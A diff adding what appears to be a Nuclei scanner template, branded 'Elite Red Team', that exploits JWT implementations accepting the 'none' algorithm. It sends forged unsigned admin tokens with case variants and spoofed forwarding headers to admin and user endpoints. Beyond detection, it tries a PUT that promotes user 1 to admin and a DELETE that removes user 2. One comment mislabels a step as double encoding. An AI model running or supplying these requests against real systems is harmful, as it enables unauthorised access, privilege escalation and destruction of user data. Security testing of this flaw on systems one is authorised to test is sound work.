@@ -1,0 +1,230 @@
+id: medium-webapp-jwt-none-algorithm-bypass
+
+info:
+  name: JWT None Algorithm Bypass - Elite Red Team
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced JWT none algorithm bypass exploitation technique.
+    Tests for JWT implementations that accept 'none' algorithm allowing signature bypass.
+    Uses multiple encoding variations and header manipulations for evasion.
+  reference:
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-347
+  tags: jwt,authentication,bypass,none-algorithm,red-team
+
+variables:
+  # Base64 encoded JWT header with "none" algorithm
+  jwt_header_none: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
+  # Base64 encoded JWT header with "None" algorithm (case variation)
+  jwt_header_none_case: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0"
+  # Base64 encoded JWT header with "NONE" algorithm
+  jwt_header_none_upper: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0"
+  # Admin payload
+  admin_payload: "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsImFkbWluIjp0cnVlLCJyb2xlIjoiYWRtaW4ifQ"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/api/admin"
+      - "{{BaseURL}}/dashboard"
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+
+    headers:
+      Authorization: "Bearer {{jwt_header_none}}.{{admin_payload}}."
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "dashboard"
+          - "welcome"
+          - "profile"
+          - "user"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "unauthorized"
+          - "forbidden"
+          - "access denied"
+        condition: and
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"role":\s*"([^"]+)"'
+          - '"admin":\s*(true|false)'
+          - '"user_id":\s*"([^"]+)"'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/api/admin"
+
+    headers:
+      Authorization: "Bearer {{jwt_header_none_case}}.{{admin_payload}}."
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "dashboard"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth/login"
+
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer {{jwt_header_none_upper}}.{{admin_payload}}."
+
+    body: |
+      {
+        "username": "admin",
+        "password": "admin"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "token"
+          - "success"
+          - "login"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users"
+      - "{{BaseURL}}/users"
+
+    headers:
+      Authorization: "JWT {{jwt_header_none}}.{{admin_payload}}."
+      X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "users"
+          - "id"
+          - "email"
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/user/1"
+      - "{{BaseURL}}/api/users/1"
+
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer {{jwt_header_none}}.eyJzdWIiOiIxIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."
+
+    body: |
+      {
+        "role": "admin",
+        "admin": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
+
+      - type: word
+        part: body
+        words:
+          - "updated"
+          - "success"
+          - "admin"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/admin/users"
+
+    headers:
+      # Double encoding attempt
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsImFkbWluIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
+      X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "users"
+          - "admin"
+        condition: and
+
+  - method: DELETE
+    path:
+      - "{{BaseURL}}/api/user/2"
+
+    headers:
+      Authorization: "Bearer {{jwt_header_none}}.{{admin_payload}}."
+      Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        part: body
+        words:
+          - "deleted"
+          - "success"
+          - "removed"
+        condition: or
